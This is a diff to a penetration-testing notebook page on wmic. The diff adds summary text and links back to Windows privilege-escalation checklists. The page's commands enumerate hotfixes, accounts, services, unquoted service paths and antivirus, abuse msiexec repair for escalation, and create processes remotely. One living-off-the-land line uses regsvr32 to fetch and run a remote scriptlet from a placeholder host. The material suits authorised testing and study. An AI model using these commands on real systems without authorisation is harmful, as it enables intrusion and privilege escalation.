@@ -9,6 +9,30 @@ hideFooterPagination: true
 
 {/* Generated from Commands/wmic.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## wmic: choose the operation and read the result
+
+Commands and examples collected from your wmic notes.
+
+### What the result establishes
+
+Read the selected WMI class and returned properties under the actual local or remote identity.
+
+### Prerequisites and common failures
+
+Availability varies across Windows installations; a missing WMIC binary does not mean WMI/CIM itself is unavailable.
+
+### Example 1: Windows Version and Configuration
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```powershell
+wmic qfe
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your wmic notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=wmic) · [All tools](/index)
 
 ## Windows Version and Configuration
@@ -18,6 +42,13 @@ hideFooterPagination: true
 ```powershell
 wmic qfe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Windows Version and Configuration](/privesc/windows-privesc-checklist#windows-version-and-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -40,6 +71,13 @@ Saved as written; may include lab values or terminal output.
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 1. Basic Host & Network Reconnaissance](/active-directory/living-off-the-land#1-basic-host-&-network-reconnaissance)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="5. Windows Management Instrumentation (WMI)">
@@ -52,17 +90,38 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic ntdomain list /format:list
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 5. Windows Management Instrumentation (WMI)](/active-directory/living-off-the-land#5-windows-management-instrumentation-wmi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Enumerate Active Directory with Built-in Tools**
 
 ```powershell
 wmic useraccount list /format:list
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 5. Windows Management Instrumentation (WMI)](/active-directory/living-off-the-land#5-windows-management-instrumentation-wmi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Enumerate Active Directory with Built-in Tools**
 
 ```powershell
 wmic group list /format:list
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 5. Windows Management Instrumentation (WMI)](/active-directory/living-off-the-land#5-windows-management-instrumentation-wmi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -84,6 +143,13 @@ systeminfo
 net user; net localgroup administrators
 Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -107,6 +173,13 @@ cmdkey /list
 schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — PHASE B — PrivEsc enumeration](/cheatsheets/windows-post-exploitation#phase-b-—-privesc-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="CustomActions">
@@ -120,6 +193,13 @@ Get-WmiObject Win32_Product | Select Name, LocalPackage
 wmic product get identifyingnumber,name,vendor,version,localpackage
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — CustomActions](/privesc/windows-privesc-checklist#customactions)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```ps1
@@ -128,6 +208,13 @@ $string= $installed | select-string -pattern "PRODUCTNAME"
 $string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
 Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — CustomActions](/privesc/windows-privesc-checklist#customactions)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -148,6 +235,13 @@ FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
 FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Incorrect permissions in services](/privesc/windows-privesc-checklist#eop-incorrect-permissions-in-services)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="EoP - Living Off The Land Binaries and Scripts">
@@ -161,6 +255,13 @@ wmic.exe process call create calc
 regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 Microsoft.Workflow.Compiler.exe tests.xml results.xml
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Living Off The Land Binaries and Scripts](/privesc/windows-privesc-checklist#eop-living-off-the-land-binaries-and-scripts)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -179,6 +280,13 @@ Get-Process
 Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -186,6 +294,13 @@ net start
 wmic service list brief
 tasklist /SVC
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Windows Privilege Escalation: Full Checklist**
 
@@ -197,6 +312,13 @@ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
 dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -214,6 +336,13 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Unquoted Service Paths](/privesc/windows-privesc-checklist#eop-unquoted-service-paths)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Windows Version and Configuration">
@@ -226,6 +355,13 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Windows Version and Configuration](/privesc/windows-privesc-checklist#windows-version-and-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -233,6 +369,13 @@ wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Windows Version and Configuration](/privesc/windows-privesc-checklist#windows-version-and-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -248,6 +391,13 @@ Get-WmiObject -Class Win32_OperatingSystem -ComputerName <IP> -Credential <user>
 Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\out.txt" -ComputerName <IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Footprinting & execution](/enumeration/windows-remote-management-protocols-cheat-sheet#footprinting-&-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Windows">
@@ -261,6 +411,13 @@ Context from the notebook: Unquoted service paths ( wmic service get name,pathna
 ```text
 wmic service get name,pathname,startmode
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -276,6 +433,13 @@ Context from the notebook: Enumerate antivirus on a box with  WMIC /Node:localho
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Antivirus Enumeration](/privesc/windows-privesc-checklist#antivirus-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MS16-032 - Microsoft Windows 7  10 / 2008  2012 R2 (x86/x64)">
@@ -290,6 +454,25 @@ Context from the notebook: Check if the patch is installed :  wmic qfe list | fi
 wmic qfe list | findstr "3139914"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)](/privesc/windows-privesc-checklist#ms16-032-microsoft-windows-7-<-10-/-2008-<-2012-r2-x86/x64)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+- [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
+- [Windows Remote Access: RDP, WinRM, and WMI](/enumeration/windows-remote-management-protocols-cheat-sheet)
+- [Privilege Escalation: Choose a Checklist](/privesc/index)
+- [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
+
+{/* VAULT_RELATED_END */}
